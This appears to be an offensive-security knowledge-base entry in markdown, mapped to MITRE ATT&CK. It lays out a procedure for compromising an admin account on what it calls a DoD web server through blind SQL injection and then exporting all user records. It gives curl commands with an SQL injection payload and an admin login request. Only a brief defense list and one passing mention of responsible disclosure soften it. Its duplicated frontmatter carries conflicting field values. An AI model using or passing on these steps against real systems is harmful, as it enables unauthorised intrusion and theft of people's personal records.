---
id: proc-uuid-3
name: Compromise-Admin-Account-and-Access-Records
tags:
  - sqli
  - account-compromise
  - privilege-escalation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-dump-users]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:19.573Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
---
id: proc-uuid-3
name: Compromise-Admin-Account-and-Access-Records
type: procedure
verified: false
submitted: false
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
tactics: [[Initial Access]], [[Collection]]
techniques: [[Exploit Public-Facing Application]]
sub_techniques: []
tags: sqli, account-compromise, privilege-escalation
commands: [[commands/curl-dump-users]]
platforms: Web
tools: []
---

# Compromise-Admin-Account-and-Access-Records

## Summary

This procedure uses blind SQLi to extract or manipulate credentials for admin account takeover, enabling full access to user records in the DoD webserver.

## Description

Building on data extraction, infer or update admin credentials via SQLi to log in as admin. This compromises the account, allowing download of all user records, though limited to non-sensitive in responsible disclosure.

## Requirements

1. Extracted schema and user table info
2. Ability to crack hashed passwords if extracted
3. Target login endpoint

## Defense

Defensive measures and detection strategies:

- Multi-factor authentication for admin accounts
- Session monitoring and anomaly detection
- Regular credential rotation

## Objectives

1. Obtain admin credentials via SQL dump
2. Authenticate as admin
3. Access and export user records

## Instructions

### Step 1: Dump User Credentials

**Context**: Extract usernames and passwords from users table.

**Command** ([[commands/curl-dump-users]]):
```bash
curl "https://target-dod-site.com/page?id=1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--"
```

> Confirm admin existence, then extract hash: adjust SUBSTRING for password field.

### Step 2: Login and Access Records

**Context**: Use extracted creds to login and navigate to records.

**Command** ([[commands/curl-dump-users]]):
```bash
curl -u admin:extracted_hash_or_plain https://target-dod-site.com/admin/records
```

> If hash cracked, login succeeds; download records.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-dump-users]]

## Tools Used


## Tags

- sqli
- account-compromise
- privilege-escalation
